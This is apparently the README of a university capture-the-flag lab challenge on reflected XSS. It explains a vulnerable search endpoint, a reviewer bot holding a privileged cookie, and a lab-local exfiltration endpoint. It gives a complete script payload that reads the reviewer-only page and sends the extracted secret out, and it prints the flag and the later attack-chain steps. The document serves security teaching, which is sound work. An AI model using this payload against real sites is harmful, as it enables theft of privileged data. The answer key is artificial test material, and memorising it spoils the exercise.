# WEB-02 — Reflected XSS (with reviewer bot)

## Category
Web vulnerability

## Objective
Steal a secret that only an internal reviewer can see, by getting the reviewer's
browser to execute a reflected-XSS payload.

## Vulnerability
`GET /search?q=` reflects `q` into the HTML response without output encoding, so
injected markup/script executes in the app's origin. The flag lives on `/review`,
which is served **only** to a client holding the reviewer cookie. A headless
reviewer bot visits any text reported via `/report`, so an attacker can make the
bot's privileged browser run script that reads `/review` and exfiltrates it.

## Components
- `app.py` — the web app (vulnerable `/search`; cookie-gated `/review`; `/report`
  queue; `/exfil` + `/stolen` so the challenge is self-contained).
- `bot.py` — headless-Chromium reviewer that visits reported payloads with the
  reviewer cookie (`docker-compose` runs it as the `web02-bot` service).

## Setup
```bash
cd machine-c/WEB02
docker compose up --build      # starts web02 (:8083) and the reviewer bot
```

## Intended Solution
1. Confirm `/review` is forbidden to you directly (403) — you need the bot to read it.
2. Submit an XSS payload via `/report?q=`, e.g.:
   ```html
   <script>
   fetch('/review').then(r=>r.text()).then(t=>{
     let m=t.match(/CITS3006\{[^}]+\}/);
     fetch('/exfil?data='+encodeURIComponent(m[0]));
   })</script>
   ```
3. The reviewer bot visits `/search?q=<payload>` with its cookie; the script reads
   `/review` and posts the secret to `/exfil`.
4. Retrieve it from `/stolen`.

## Chain position
The reviewer-only `/review` console returns the WEB-02 flag **and** an internal
ops note. Exfiltrating that note via the XSS reveals that the legacy rsync
service (tcp/1873, module `legacy-sync`) is still exposed — the entry point for
NET-02. WEB-02 is therefore the recon foothold at the top of the chain.

`WEB-02 (this) → NET-02 (rsync) → HORIZ-02 (IDOR) → VERT-02 (SUID root)`

## Flag
CITS3006{WEB02_REFLECTED_XSS}
